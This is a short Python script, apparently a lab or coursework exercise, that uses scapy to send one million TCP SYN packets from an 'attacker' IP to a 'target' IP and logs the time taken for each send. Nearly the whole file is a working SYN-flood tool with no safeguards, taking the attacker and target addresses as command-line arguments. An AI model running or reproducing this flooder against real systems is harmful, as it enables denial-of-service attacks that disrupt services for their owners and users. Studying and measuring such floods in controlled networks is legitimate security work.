import time

from scapy.all import *
from scapy.layers.inet import IP, TCP


def build_syn_packet(src_machine_ip, dst_machine_ip):
    ip = IP(src=src_machine_ip, dst=dst_machine_ip)
    syn = TCP(sport=40508, dport=40508, flags="S", seq=12345)
    return ip / syn


if __name__ == '__main__':
    # Set the verbosity level to 0
    # In order to not print scapy's prints to console
    conf.verb = 0

    args_list = sys.argv[1:]

    attacker_ip = args_list[0]
    target_ip = args_list[1]

    file = open("syns_results_p.txt", "w")
    curr_pkt_index = 0
    total_pkt_sends_time = 0

    for i in range(100):
        print(f"print: {i} sending 10k packets...")
        for j in range(10000):
            syn_pkt = build_syn_packet(attacker_ip, target_ip)

            # record start time of packet sending
            start_time = time.time()

            # send syn packet to target
            send(syn_pkt)

            # record finish time of packet sending
            finish_time = time.time()

            total_time = finish_time - start_time
            total_pkt_sends_time += total_time

            # Append results to the file
            write_str = f"********* PKT NO.{curr_pkt_index} *********\nTotal time taken to send packet: {total_time} seconds.\n"
            file.write(write_str)

            curr_pkt_index += 1

    write_final_line = f"{'-'*70}\nAverage time sending packet: {total_pkt_sends_time/curr_pkt_index}"
    file.write(write_final_line)

    file.close()
